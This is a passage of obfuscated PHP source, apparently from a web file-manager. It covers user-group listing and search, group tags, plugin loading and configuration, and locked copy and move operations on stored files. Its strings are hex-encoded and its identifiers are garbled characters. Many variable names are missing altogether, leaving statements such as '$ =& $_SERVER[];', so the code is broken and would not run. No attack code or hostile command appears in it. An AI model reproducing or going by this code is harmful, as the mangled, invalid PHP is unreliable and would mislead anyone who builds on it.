as $ﬁúƒò) { $∆ß[] = "\163\x65\x6c\145\143\x74\40\x67\x72\157\x75\160\111\104\x20\146\x72\157\155\40\140\147\x72\x6f\165\160\140\x20\167\x68\x65\162\x65\x20\160\141\x72\x65\x6e\164\x4c\x65\x76\145\x6c\40\x6c\x69\x6b\x65\40\47{$ﬁúƒò[$‰≥¥[562]]}{$ﬁúƒò[$‰≥¥[1883]]}\54\x25\x27"; } $∆ß = implode($‰≥¥[1976], $∆ß); $·ç´ = $this->query($∆ß); if (!$·ç´) { return array(); } $—ú⁄Ö = array_to_keyvalue($·ç´, $‰≥¥[22], $‰≥¥[1883]); return array_unique($—ú⁄Ö); } public function listByID($—í) { $ =& $_SERVER[]; if (!$—í) { return array(); } $ = array($[1883] => array($[17], $—í)); $ = $this->where($)->select(); $ = array_sort_keep($, $[1883], $—í); $this->_listDataApply($); return $; } public function listSearch($) { $œàﬂò =& $_SERVER[]; $ÍíÉ = $[$œàﬂò[1977]]; $Á¥π⁄™ = isset($[$œàﬂò[1978]]) ? $[$œàﬂò[1978]] : !1; if (!trim($ÍíÉ)) { return !1; } $ÍíÉ = str_replace($œàﬂò[1979], $œàﬂò[1980], $ÍíÉ); $Õ∂ = array($œàﬂò[1883] => array($œàﬂò[436], "{$ÍíÉ}\45"), $œàﬂò[42] => array($œàﬂò[436], "\45{$ÍíÉ}\x25"), $œàﬂò[1041] => $œàﬂò[1981]); if ($Á¥π⁄™) { $ = $this->getInfoSimple($Á¥π⁄™); $¬è = $[$œàﬂò[562]] . $Á¥π⁄™ . $œàﬂò[590]; $Õ∂ = array($Õ∂, array($œàﬂò[562] => array($œàﬂò[436], $¬è))); } $Õ∂ = $this->parseWhereLike($Õ∂); $ = $this->_makeOrder()->where($Õ∂)->selectPage(20); $ = $ ? $ : array($œàﬂò[422] => array(), $œàﬂò[419] => array()); if (!$ || count($[$œàﬂò[422]]) < 5 && Input::check($ÍíÉ, $œàﬂò[371])) { $ = $this->groupChildrenAll($Á¥π⁄™); $—∞ = $this->_searchFromMeta($œàﬂò[514], $ÍíÉ, 10, $); $ = $this->_searchFromMeta($œàﬂò[515], $ÍíÉ, 10, $); $ = array_merge($—∞, $, $[$œàﬂò[422]]); $[$œàﬂò[422]] = array_unique_by_key($, $œàﬂò[1883]); $[$œàﬂò[419]][$œàﬂò[420]] = count($[$œàﬂò[422]]); $[$œàﬂò[419]][$œàﬂò[421]] = ceil($[$œàﬂò[419]][$œàﬂò[420]] / $[$œàﬂò[419]][$œàﬂò[416]]); } $this->_listDataApply($[$œàﬂò[422]]); return $; } protected function groupChildrenAll($) { $÷≥ =& $_SERVER[]; if (!$) { return !1; } if (is_string($)) { $ = array($); } $‹Ä = $; foreach ($ as $) { $«Ñ = $this->getInfoSimple($); $ = array($÷≥[562] => array($÷≥[436], $«Ñ[$÷≥[562]] . $ . $÷≥[590])); $œØ = $this->field($÷≥[1883])->where($)->select(); $‹Ä = array_merge($‹Ä, array_to_keyvalue($œØ, $÷≥[22], $÷≥[1883])); } return array_unique($‹Ä); } private function _searchFromMeta($Â©Ω—ü, $, $…ß, $Èº¥) { $Õ∑ =& $_SERVER[]; $ = strtolower($); $Œµ⁄¶ = array($Õ∑[104] => $Â©Ω—ü, $Õ∑[427] => array($Õ∑[436], "\x25{$}\45")); $Œµ⁄¶ = $this->parseWhereLike($Œµ⁄¶); if ($Èº¥) { $Œµ⁄¶[$Õ∑[1883]] = array($Õ∑[17], $Èº¥); } $’Ü = Model($Õ∑[1982])->where($Œµ⁄¶)->limit($…ß)->select(); if (!$’Ü) { return array(); } $’Ü = array_to_keyvalue($’Ü, $Õ∑[22], $Õ∑[1883]); $÷ø = $this->where(array($Õ∑[1971] => array($Õ∑[17], $’Ü)))->select(); if (!$÷ø) { return array(); } return $÷ø; } protected function _listDataApplyItem($≈Ñ) { $⁄ï = array($≈Ñ); $this->_listDataApply($⁄ï); return $⁄ï[0]; } protected function _listDataApply(&$) { $›¢ =& $_SERVER[]; if (!$) { return; } $Ãú—° = array_to_keyvalue($, $›¢[22], $›¢[1883]); $this->_listAppendChildren($); $this->_listAppendChildrenMember($); $this->_listAppendMeta($, $Ãú—°); $this->_listAppendParent($); $this->_listAppendSourceRoot($, $Ãú—°); } private function _listAppendChildren(&$) { $¬ºœ® =& $_SERVER[]; $…ê = array_to_keyvalue($, $¬ºœ®[22], $¬ºœ®[1883]); $ = array($¬ºœ®[190] => array($¬ºœ®[17], $…ê)); $ = array($¬ºœ®[190], $¬ºœ®[1983] => $¬ºœ®[542]); $–ö⁄™ = $this->field($)->where($)->group($¬ºœ®[190])->select(); $…¶ = array_to_keyvalue($–ö⁄™, $¬ºœ®[190], $¬ºœ®[542]); foreach ($ as &$Îä•) { $“û = $Îä•[$¬ºœ®[1883]]; $Îä•[$¬ºœ®[1984]] = isset($…¶[$“û]) ? intval($…¶[$“û]) : !1; } unset($Îä•); } private function _listAppendChildrenMember(&$Ûßø∫) { $Ãæÿº =& $_SERVER[]; $›Ñ = array_to_keyvalue($Ûßø∫, $Ãæÿº[22], $Ãæÿº[1883]); $ = array($Ãæÿº[1883] => array($Ãæÿº[17], $›Ñ)); $—¥ = array($Ãæÿº[1883], $Ãæÿº[1983] => $Ãæÿº[542]); $ƒ¶ = Model($Ãæÿº[1973])->field($—¥)->where($)->group($Ãæÿº[1883])->select(); $–Ø = array_to_keyvalue($ƒ¶, $Ãæÿº[1883], $Ãæÿº[542]); foreach ($Ûßø∫ as &$‘¨) { $·àï = $‘¨[$Ãæÿº[1883]]; $‘¨[$Ãæÿº[1985]] = isset($–Ø[$·àï]) ? intval($–Ø[$·àï]) : !1; } unset($‘¨); } private function _listAppendMeta(&$ƒù, $) { $ =& $_SERVER[]; $⁄≥Èáó = array($[1883] => array($[17], $)); $ = Model($[1972])->where($⁄≥Èáó)->select(); $ = array_to_keyvalue_group($, $[1883]); foreach ($ as &$) { $ = array_to_keyvalue($, $[104], $[427]); } unset($); foreach ($ƒù as &$ŒÇ) { $ŒÇ[$[516]] = array(); if (isset($[$ŒÇ[$[1883]]])) { $ŒÇ[$[516]] = $[$ŒÇ[$[1883]]]; } } unset($ŒÇ); } protected function parentLevelArray($) { $ =& $_SERVER[]; $ = explode($[60], trim($, $[60])); $ = array_remove_value($, $[222]); return $; } protected function parentInGroup($ﬂó, $€úŒó) { $’ë =& $_SERVER[]; $ = $this->getInfoSimple($ﬂó); if (!$) { return !0; } $ÈÅÉ = $this->parentLevelArray($[$’ë[562]]); $ÈÅÉ[] = $ﬂó; foreach ($ÈÅÉ as $ﬂó) { if (in_array($ﬂó . $’ë[22], $€úŒó)) { return !0; } } return !1; } private function _listAppendParent(&$) { $ =& $_SERVER[]; $ﬁΩ = array(); foreach ($ as &$—∏) { $ﬁΩ[$—∏[$[1883]]] = $—∏[$[42]]; $ = $this->parentLevelArray($—∏[$[562]]); foreach ($ as $) { if (!isset($ﬁΩ[$])) { $ﬁΩ[$] = 0; } } } unset($—∏); foreach ($ﬁΩ as $÷ò => $œæﬂ∑) { if ($œæﬂ∑) { continue; } $Ÿ™ = $this->getInfoSimple($÷ò); $ﬁΩ[$÷ò] = $Ÿ™[$[42]]; } $ = $GLOBALS[$[16]][$[99]][$[1986]]; if ($GLOBALS[$[545]] == $[98]) { $ = !1; } foreach ($ as &$—∏) { $ = $this->parentLevelArray($—∏[$[562]]); $ƒî = $[22]; foreach ($ as $÷ò => $) { if ($ && $÷ò == 0) { continue; } $ƒî .= $ﬁΩ[$] . $[18]; } if ($) { $ƒî .= $—∏[$[42]]; } $—∏[$[567]] = str_replace($[570], $[18], $ƒî); } unset($—∏); } private function _listAppendSourceRoot(&$ﬂê, $ÏÄü) { $€ó =& $_SERVER[]; $’π = Model($€ó[865])->listSourceRoot(SourceModel::TYPE_GROUP, $ÏÄü); $’π = array_to_keyvalue($’π, $€ó[547]); $’π = array_remove_key($’π, $€ó[547]); foreach ($ﬂê as &$) { $[$€ó[97]] = $’π[$[$€ó[1883]]] ? $’π[$[$€ó[1883]]] : array(); } unset($); } protected function groupMerge($) { $ = array_values(array_unique($)); $“ì = array(); for ($Ÿ≤ = 0; $Ÿ≤ < count($); $Ÿ≤++) { $ = !1; for ($«Ä = 0; $«Ä < count($); $«Ä++) { if ($Ÿ≤ == $«Ä) { continue; } if ($this->isParentOf($[$«Ä], $[$Ÿ≤])) { $ = !0; break; } } if (!$) { $“ì[] = $[$Ÿ≤]; } } return $“ì; } protected function isParentOf($, $Òå≤∞) { $ =& $_SERVER[]; if (!$ || !$Òå≤∞ || $ == $Òå≤∞) { return !1; } $ = $this->getInfoSimple($); $∆âﬁ§ = $this->getInfoSimple($Òå≤∞); $ﬁÄ = $[$[562]] . $ . $[60]; if (substr($∆âﬁ§[$[562]], 0, strlen($ﬁÄ)) == $ﬁÄ) { return !0; } return !1; } public function groupShowRoot($ÕÄ, $ÃçŒ∑ = false) { $–û›∂ =& $_SERVER[]; $—ã‚çü = $this->getInfo($ÕÄ); if (!$—ã‚çü) { return array(); } $È∞Æ = $this->parentLevelArray($—ã‚çü[$–û›∂[562]]); $ = array($ÕÄ); if (count($È∞Æ) == 0) { return $; } if ($ÃçŒ∑ && count($È∞Æ) == 1) { return $; } if (!$—ã‚çü[$–û›∂[516]] || !isset($—ã‚çü[$–û›∂[516]][$–û›∂[1969]]) || $—ã‚çü[$–û›∂[516]][$–û›∂[1969]] == $–û›∂[1938]) { return $this->groupShowRoot($È∞Æ[count($È∞Æ) - 1], $ÃçŒ∑); } if ($—ã‚çü[$–û›∂[516]][$–û›∂[1969]] == $–û›∂[410]) { $ = explode($–û›∂[60], $—ã‚çü[$–û›∂[516]][$–û›∂[1970]]); if ($) { $ = array_merge($, $); } } return $; } protected function resetParentLevel() { $—¥ =& $_SERVER[]; $Èá∞ = $—¥[1883]; $ŒΩ = $this->select(); $ŒΩ = array_to_keyvalue($ŒΩ, $Èá∞); foreach ($ŒΩ as $Î∫ù) { $‰Øå≈≤ = $Î∫ù; $Óâî = array(); while ($‰Øå≈≤[$—¥[190]] != 0) { $Óâî[] = $‰Øå≈≤[$—¥[190]]; $‰Øå≈≤ = $ŒΩ[$‰Øå≈≤[$—¥[190]]]; } $Óâî[] = 0; $Óâî = $—¥[60] . implode($—¥[60], array_reverse($Óâî)) . $—¥[60]; $this->setNamePinyin($Î∫ù[$Èá∞], $Î∫ù[$—¥[42]]); $this->where(array($Èá∞ => $Î∫ù[$Èá∞]))->save(array($—¥[629] => $Óâî)); } return $ŒΩ; } public function groupNameAuto($, $) { $ =& $_SERVER[]; $“® = $this->where(array($[454] => $))->getField($[42], !0); if (!$“® || !in_array($, $“®)) { return $; } for ($ = 1; $ <= count($“®) + 1; $++) { $÷í = $ . "\x28{$}\x29"; if (!in_array($÷í, $“®)) { return $÷í; } } } public function groupSwitch($”ø, $–±) { $“´ =& $_SERVER[]; $ = array($“´[1883] => array($“´[17], array($”ø, $–±))); $ = $this->where($)->select(); $ = array_to_keyvalue($, $“´[1883]); if (!isset($[$”ø]) || !isset($[$–±]) || $[$”ø][$“´[190]] == 0) { return !1; } $ = array($“´[1883] => $”ø); $ = Model($“´[1973])->where($)->select(); if (!$) { $ = array(); } foreach ($ as $ÃÜ) { $ = $ÃÜ[$“´[1685]]; $ = array($“´[1685] => $, $“´[1883] => $–±); $ = Model($“´[1973])->where($)->find(); if (!$) { $ = array($–± => $ÃÜ[$“´[1987]]); Model($“´[576])->userGroupAdd($, $); } Model($“´[576])->userGroupRemove($, $”ø); } $ = array($“´[188] => 2, $“´[190] => 0, $“´[462] => 1, $“´[547] => array($“´[17], array($”ø, $–±))); $ = Model($“´[865])->where($)->field($“´[1988])->select(); $ = array_to_keyvalue($, $“´[547], $“´[191]); $‘™ = !empty($[$”ø]) ? $[$”ø] : !1; if ($‘™) { if (!$[$–±]) { $[$–±] = Model($“´[865])->groupRootAdd($–±); } $π∞õ = $[$–±]; $ = array($“´[190] => $‘™); $ = Model($“´[865])->where($)->field($“´[1989])->select(); if (!$) { $ = array(); } Model($“´[865])->moveClearAuth = !1; foreach ($ as $“¨) { $’è = $“¨[$“´[462]] == $“´[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($“´[865])->move($“¨[$“´[191]], $π∞õ, $’è); } Model($“´[865])->moveClearAuth = !0; $ = array($“´[188] => 2, $“´[547] => $”ø); $Ò∂∏∫ = array($“´[547] => $–±); Model($“´[1990])->where($)->save($Ò∂∏∫); Model($“´[1991])->where($)->save($Ò∂∏∫); } $this->_changeChildLevel($[$”ø], $[$–±], !0); $this->where(array($“´[190] => $”ø))->save(array($“´[190] => $–±)); $this->_clearChildrenCache($[$–±]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($) { $⁄µ =& $_SERVER[]; return array($⁄µ[1992] => array($[0], $⁄µ[1993]), $⁄µ[1994] => array($[0], $⁄µ[1995])); } protected function get($) { $ =& $_SERVER[]; $Êã∑ = Model($[563])->metaGet($, $[1996]); $›ç = json_decode($Êã∑, !0); return $›ç ? $›ç : array($[1997] => $[98], $[422] => array()); } protected function set($, $»§) { $ =& $_SERVER[]; $»§ = $»§ ? $»§ : array($[1997] => $[98], $[422] => array()); return Model($[563])->metaSet($, $[1996], json_encode($»§)); } protected function getByTagID($–ë÷∞, $) { $ =& $_SERVER[]; if (!$–ë÷∞ || !$) { return !1; } if (!Model($[563])->getInfoSimple($–ë÷∞)) { return !1; } $ﬁà = $this->get($–ë÷∞); if (!$ﬁà || !isset($ﬁà[$[422]])) { return !1; } $Œú = array_find_by_field($ﬁà[$[422]], $[452], $); return is_array($Œú) ? $Œú : !1; } public function listSource($ËÉ≠, $) { $ =& $_SERVER[]; if ($ && !is_array($)) { $ = array($); } $…é = $this->listData($ËÉ≠); $‡∑á = array(); foreach ($…é as $) { $¬è = $[$[94]]; if (!$¬è) { continue; } if (!isset($‡∑á[$¬è])) { $‡∑á[$¬è] = array(); } $‡∑á[$¬è][] = $[$[477]]; } $ = array(); foreach ($‡∑á as $ => $) { $ÿê∆∏ = !0; if (!$) { $[] = $; continue; } foreach ($ as $) { if (!in_array($, $)) { $ÿê∆∏ = !1; break; } } if ($ÿê∆∏) { $[] = $; } } if (!$) { return array(); } $≈Ö”º = array($[468] => array($[469], $), $[547] => $ËÉ≠, $[188] => SourceModel::TYPE_GROUP); $ = Model($[1373])->listSource($≈Ö”º); if (!$ || count($) == $[$[419]][$[420]]) { return $; } $ƒ∂ = array(); $Œ∫ = array_to_keyvalue($[$[92]], $[22], $[191]); $ÃêÿÆ = array_to_keyvalue($[$[93]], $[22], $[191]); $È≥ó = array_merge($ÃêÿÆ, $Œ∫); foreach ($ as $¬è) { if (!in_array($¬è, $È≥ó)) { $ƒ∂[] = $¬è; } } if ($ƒ∂) { $this->removeBySource($ËÉ≠, $ƒ∂); } return $; } protected function listData($) { $…ú =& $_SERVER[]; $ = array($…ú[1676] => 0, $…ú[534] => array($…ú[1998], 0), $…ú[473] => $…ú[1999] . $); $⁄§ = $…ú[2000]; $⁄≠‘µ≈ì = $this->field($⁄§)->where($)->order($…ú[2001])->select(); return $⁄≠‘µ≈ì ? $⁄≠‘µ≈ì : array(); } protected function addToTag($ﬁ≤»°, $÷´’è, $÷ò) { $Ó¥î =& $_SERVER[]; if (!$this->getByTagID($ﬁ≤»°, $÷ò) || !$÷´’è) { return !1; } if (!Model($Ó¥î[865])->pathInfo($÷´’è)) { return !1; } $ﬂ¨‹≤ = array($Ó¥î[1676] => 0, $Ó¥î[534] => $÷ò, $Ó¥î[472] => $÷´’è, $Ó¥î[473] => $Ó¥î[2002] . $ﬁ≤»°, $Ó¥î[471] => $Ó¥î[22], $Ó¥î[1887] => 0); if ($this->where($ﬂ¨‹≤)->find()) { return !1; } return $this->add($ﬂ¨‹≤); } protected function removeFromTag($Êà¨⁄É, $‘ó, $ﬁú) { $Ìáé =& $_SERVER[]; if (!$this->getByTagID($Êà¨⁄É, $ﬁú) || !$‘ó) { return !1; } if (is_array($‘ó)) { $‘ó = array($Ìáé[17], $‘ó); } $ = array($Ìáé[1676] => 0, $Ìáé[534] => $ﬁú, $Ìáé[473] => $Ìáé[2002] . $Êà¨⁄É, $Ìáé[472] => $‘ó); return $this->where($)->delete(); } protected function removeByTag($ÿà, $) { $ =& $_SERVER[]; if (!$this->getByTagID($ÿà, $)) { return !1; } $ = array($[1676] => 0, $[534] => $, $[473] => $[2002] . $ÿà); return $this->where($)->delete(); } protected function removeBySource($ÔúØ, $ﬁ≤) { $ =& $_SERVER[]; if (!$ÔúØ || !$ﬁ≤) { return !1; } if (is_array($ﬁ≤)) { $ﬁ≤ = array($[17], $ﬁ≤); } $ = array($[1676] => 0, $[472] => $ﬁ≤, $[534] => array($[1055], 0), $[473] => $[2002] . $ÔúØ); return $this->where($)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x70\154\165\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\164\141\x74\165\163", "\162\145\x67\x69\145\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($ = false) { $ = array_to_keyvalue($this->listData(), $_SERVER[][42]); if ($) { return $[$]; } return $; } public function init() { $ =& $_SERVER[]; Hook::trigger($[2003]); $ = $this->loadPluginList(); foreach ($ as $≈ì‘ñ => $«Ç) { $ = $this->appAllow($≈ì‘ñ, $«Ç); if (!$) { continue; } foreach ($«Ç[$[2004]] as $Â´• => $⁄£ƒ´) { Hook::bind($Â´•, $⁄£ƒ´); } } Hook::trigger($[2005]); Hook::trigger(ACTION); } public function appAllow($, $, $ = true) { $ =& $_SERVER[]; $‹øœà = PLUGIN_DIR . $ . $[2006]; if (!is_array($) || !is_array($[$[2004]]) || $[$[790]] != 1 || !is_file($‹øœà)) { return !1; } if ($GLOBALS[$[545]] == 1) { if ($GLOBALS[$[16]][$[2007]] || !$GLOBALS[$[16]][$[2008]]) { return !0; } $ = explode($[60], strtolower($GLOBALS[$[16]][$[2008]])); return in_array(strtolower($), $) ? !1 : !0; } if ($ && !Action($[2009])->checkAuth($)) { return !1; } return !0; } public function unInstall($) { $„°≥À∫ =& $_SERVER[]; $—ì = $this->loadList($); if (file_exists(PLUGIN_DIR . $)) { Hook::apply($ . $„°≥À∫[2010]); } $this->remove($—ì[$„°≥À∫[452]]); } public function changeStatus($, $…ó) { $“¢ =& $_SERVER[]; $Îíù = $this->loadList($); if ($…ó) { Hook::apply($ . $“¢[2011]); } $this->update($Îíù[$“¢[452]], array($“¢[2012] => $…ó)); } public function appRegist($, $÷©) { $›Ω =& $_SERVER[]; $ = $this->loadList($); if ($) { $this->update($[$›Ω[452]], array($›Ω[2004] => $÷©)); } else { $ = array($›Ω[42] => $, $›Ω[2004] => $÷©, $›Ω[790] => 0, $›Ω[16] => $this->getConfigDefault($)); $this->insert($); } } public function getConfigDefault($) { $ =& $_SERVER[]; $ = array(); $ ë = $this->getPackageJson($); if (!$ ë && is_array($ ë[$[2013]])) { return $; } foreach ($ ë[$[2013]] as $⁄üÍóÇ => $–ü) { if (!isset($–ü[$[427]]) || isset($[$⁄üÍóÇ])) { continue; } $[$⁄üÍóÇ] = $–ü[$[427]]; } return $; } public function getPackageJson($’º) { return Hook::apply($’º . $_SERVER[][2014]); } public function getConfig($…º, $≈â = false) { $’é =& $_SERVER[]; $»û = array(); $Èø¢ = $this->loadList($…º); if ($Èø¢ && is_array($Èø¢[$’é[16]])) { $»û = $Èø¢[$’é[16]]; } if (!$»û || $≈â) { $»û = $this->getConfigDefault($…º); } return $»û; } public function setConfig($ ∂, $ = false) { $Óéî =& $_SERVER[]; $Ë¶ª = $this->loadList($ ∂); if (!$Ë¶ª) { return !1; } $ = $Ë¶ª[$Óéî[16]]; if ($ == !1) { $ = array(); $ = $this->getConfigDefault($ ∂); } foreach ($ as $ÿéÒûÑø => $) { $[$ÿéÒûÑø] = is_string($) ? trim($) : $; } $this->update($Ë¶ª[$Óéî[452]], array($Óéî[16] => $)); } public function viewList() { $ ß =& $_SERVER[]; $Á¨£ = $this->loadList(); $this->pluginScan($Á¨£); $Á¨£ = $this->loadPluginList(); $‘î = array(); foreach ($Á¨£ as $Ãå => $) { unset($[$ ß[2004]], $[$ ß[16]]); $ = PLUGIN_DIR . $[$ ß[42]] . $ ß[2006]; if (!is_file($)) { continue; } $ = Hook::apply($[$ ß[42]] . $ ß[2014]); if (is_array($)) { $‘î[$Ãå] = array_merge($, $); } } return $‘î; } private function loadPluginList() { $ =& $_SERVER[]; $√ö = $this->loadList(); if (strtolower(MOD) == $[2015]) { return $√ö; } $‰åº = Hook::trigger($[2016], $√ö); if ($√ö && !$‰åº) { die; } return $‰åº ? $‰åº : $√ö; } private function pluginScan($) { $«Ñ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $, $, 0); foreach ($ as $ÔÄî) { $ = get_path_this($ÔÄî); if (isset($[$]) || !file_exists($ÔÄî . $«Ñ[2017]) || !file_exists($ÔÄî . $«Ñ[2006])) { continue; } Hook::apply($ . $«Ñ[2011]); } } } goto B Ö; Bƒä: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ﬁå) { $Œú =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Œú[595], $ﬁå); $Á¢ä = 1; $this->_lockEvent($ﬁå, array($Œú[596], $Œú[597]), $Á¢ä); $this->_lockParent($ﬁå, array($Œú[597]), $Á¢ä); $this->_lockEvent($ﬁå, array($Œú[598], $Œú[599]), $Á¢ä); $this->_lockCheckEnd($Œú[595], $ﬁå); } public function lockCopyEnd($) { $¬∞ =& $_SERVER[]; if (!$this->allowLock()) { return; } $ = 0; $this->_lockEvent($, array($¬∞[596], $¬∞[597]), $); $this->_lockParent($, array($¬∞[597]), $); $this->_lockEvent($, array($¬∞[598], $¬∞[599]), $); } public function lockWriteStart($…å⁄ä, $ = '') { $Òèå¢ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Òèå¢[596], $…å⁄ä); $Ïòù = 1; $this->_lockKey($Òèå¢[600] . $…å⁄ä . $Òèå¢[20] . $, $Ïòù); $this->_lockEvent($…å⁄ä, array($Òèå¢[595], $Òèå¢[597]), $Ïòù); $this->_lockParent($…å⁄ä, array($Òèå¢[595], $Òèå¢[597]), $Ïòù); $this->_lockCheckEnd($Òèå¢[596], $…å⁄ä); } public function lockWriteEnd($ﬂ•Ã§, $ = '') { $‡§ë =& $_SERVER[]; if (!$this->allowLock()) { return; } $ = 0; $this->_lockKey($‡§ë[600] . $ﬂ•Ã§ . $‡§ë[20] . $, $); $this->_lockEvent($ﬂ•Ã§, array($‡§ë[595], $‡§ë[597]), $); $this->_lockParent($ﬂ•Ã§, array($‡§ë[595], $‡§ë[597]), $); } public function lockMoveStart($‰Ää) { $…¶ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($…¶[597], $‰Ää); $€∏ = 1; $this->_lockKey($…¶[601] . $‰Ää, $€∏); $this->_lockEvent($‰Ää, array($…¶[595], $…¶[596]), $€∏); $this->_lockParent($‰Ää, array($…¶[595], $…¶[597]), $€∏); $this->_lockEvent($‰Ää, array($…¶[602], $…¶[598], $…¶[599]), $€∏); $this->_lockCheckEnd($…¶[597], $‰Ää); } public function lockMoveEnd($) { $ =& $_SERVER[]; if (!$this->allowLock()) { return; } $Áõ∏ = 0; $this->_lockKey($[601] . $, $Áõ∏); $this->_lockEvent($, array($[595], $[596]), $Áõ∏); $this->_lockParent($, array($[595], $[597]), $Áõ∏); $this->_lockEvent($, array($[602], $[598], $[599]), $Áõ∏); } private function _lockCheck($√≥, $‡†™„ìÄ) { $÷Æ =& $_SERVER[]; $’§ = $this->sourceInfo($‡†™„ìÄ); $€≥ = $√≥ . $÷Æ[20] . $‡†™„ìÄ; $this->_lockTimeStart[$€≥] = timeFloat(); if (!is_array($’§)) { return; } $ = LNG($÷Æ[603]); CacheLock::setErrorMsg($÷Æ[173] . htmlspecialchars($’§[$÷Æ[42]]) . $÷Æ[175] . $); $this->_lockKey($€≥, 1); $this->_lockKey($€≥, 0); $ = array_reverse($this->parentLevelArray($’§[$÷Æ[562]])); foreach ($ as $Ã≤) { $€≥ = $√≥ . $÷Æ[604] . $Ã≤; if (CacheLock::lockGet($÷Æ[605] . $€≥)) { $’§ = $this->sourceInfo($Ã≤); CacheLock::setErrorMsg($÷Æ[173] . htmlspecialchars($’§[$÷Æ[42]]) . $÷Æ[175] . $); $this->_lockKey($€≥, 1); $this->_lockKey($€≥, 0); } } } private function _lockCheckEnd($·Å™, $◊ô) { $ﬁá =& $_SERVER[]; $ = $·Å™ . $ﬁá[20] . $◊ô; CacheLock::setErrorMsg($ﬁá[431]); if (!isset($this->_lockTimeStart[$])) { return; } $—î = timeFloat() - $this->_lockTimeStart[$]; unset($this->_lockTimeStart[$]); if ($—î > 0.5) { unset(self::$cacheSourceInfo[$ﬁá[510] . $◊ô]); } $ Ö = $this->sourceInfo($◊ô); if (!$ Ö) { show_json(LNG($ﬁá[115]), !1); } } private function _lockParent($…Ω, $À¶, $) { if (!$this->autoLockSet) { return; } $ƒâ = $this->sourceInfo($…Ω); if (!is_array($ƒâ)) { return; } $ﬁΩ = array_reverse($this->parentLevelArray($ƒâ[$_SERVER[][562]])); foreach ($ﬁΩ as $Ô©§) { $this->_lockEvent($Ô©§, $À¶, $); } } private function _lockEvent($∆´, $·Ö≠, $È≠∏) { $Õâ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($·Ö≠ as $◊ª) { $‹π = $◊ª . $Õâ[20] . $∆´; if ($È≠∏ && CacheLock::lockGet($Õâ[605] . $‹π)) { continue; } $this->_lockKey($‹π, $È≠∏); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÿà, $ = 1) { $œé = $_SERVER[][605] . md5($ÿà); if ($) { if (isset(self::$_lockItemArr[$œé])) { return; } self::$_lockItemArr[$œé] = 1; CacheLock::lock($œé, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$œé])) { return; } unset(self::$_lockItemArr[$œé]); CacheLock::unlock($œé); } } public function isParentOf($“∑, $) { $ =& $_SERVER[]; $ = $this->sourceInfo($“∑); $ = $this->sourceInfo($); $ = $[$[562]] . $[$[191]] . $[60]; $⁄ø = $[$[562]] . $[$[191]] . $[60]; $ = strpos($⁄ø, $) === 0; return $; } private $targetIsDelete = 0; public function copy($Ïê∑, $, $·ÖúŒÄ = REPEAT_REPLACE, $«Ñ = '') { $Ûêçé =& $_SERVER[]; $ﬁ¢ = $this->sourceInfo($Ïê∑); $€ï›∏ = $this->sourceInfo($); if (!$ﬁ¢ || !$€ï›∏ || $€ï›∏[$Ûêçé[462]] != $Ûêçé[98]) { return !1; } if ($this->isParentOf($Ïê∑, $)) { return !1; } $’∫ = $«Ñ ? $«Ñ : $ﬁ¢[$Ûêçé[42]]; $this->lockCopyStart($Ïê∑); $this->lockWriteStart($, $’∫); $‹ß = array($Ûêçé[606] => array(), $Ûêçé[607] => array(), $Ûêçé[608] => array()); $this->targetIsDelete = intval($ﬁ¢[$Ûêçé[482]]); $ = $this->fileNameExistAuto($, $ﬁ¢); $÷á = $this->_copy($Ïê∑, $, $·ÖúŒÄ, $‹ß, !0, $«Ñ); $this->_childrenListClear(); $this->lockCopyEnd($Ïê∑); $this->lockWriteEnd($, $’∫); if ($ﬁ¢[$Ûêçé[462]] == $Ûêçé[98] && $ == $÷á) { $this->folderSizeResetChildren($); } Model($Ûêçé[609])->addAll($‹ß[$Ûêçé[607]], array(), !0); if ($ != $÷á || $ﬁ¢[$Ûêçé[462]] == $Ûêçé[98]) { Model($Ûêçé[610])->eventCopy($÷á); } $this->saveAll($‹ß[$Ûêçé[608]]); Model($Ûêçé[224])->linkAdd($‹ß[$Ûêçé[606]]); $this->folderSizeReset($); $this->updateModifyTime($); return $÷á; } private function _copy($¬ø, $ƒì, $Û®≥Ω, &$”°, $«´, $‰û∑ = '') { $ =& $_SERVER[]; $…É = $this->sourceInfoCache($¬ø); $ = $…É[$[462]] == $[98]; $›Ø = $‰û∑ ? $‰û∑ : $…É[$[42]]; $ = $this->fileNameExistAuto($ƒì, $…É); if ($«´) { $this->_childrenAllMake($¬ø); if ($ && $) { $this->_childrenAllMake($); } } if (!$) { return $this->_copyCreate($¬ø, $ƒì, $›Ø, $”°); } $”ê = $; if ($) { if ($Û®≥Ω == REPEAT_RENAME_FOLDER) { $›Ø = $this->fileNameAutoCache($ƒì, $›Ø, $Û®≥Ω, $); $”ê = $this->_copyCreate($¬ø, $ƒì, $›Ø, $”°); } else { $ = $this->_childrenList($¬ø); foreach ($ as $) { $this->_copy($[$[191]], $, $Û®≥Ω, $”°, !1); } } } else { if ($Û®≥Ω == REPEAT_RENAME || $Û®≥Ω == REPEAT_RENAME_FOLDER) { $›Ø = $this->fileNameAutoCache($ƒì, $›Ø, $Û®≥Ω, $); $”ê = $this->_copyCreate($¬ø, $ƒì, $›Ø, $”°); } else { if ($Û®≥Ω == REPEAT_REPLACE) { $ = $this->sourceInfoCache($); $Íã¥ = $this->fileHistory($, $…É[$[518]], $…É[$[86]]); if ($Íã¥) { $”°[$[606]][] = $…É[$[518]]; } } else { if ($Û®≥Ω == REPEAT_SKIP) { } } } Hook::trigger($[611], array($[612], $…É, 0)); } return $”ê; } private function _copyCreate($√®, $÷ï, $, &$ÃÅ) { $—º =& $_SERVER[]; $ = $this->sourceInfoCache($√®); $Ò®Éß = $this->sourceInfoCache($÷ï); $’∑ = $this->_makeItemData($, $Ò®Éß, 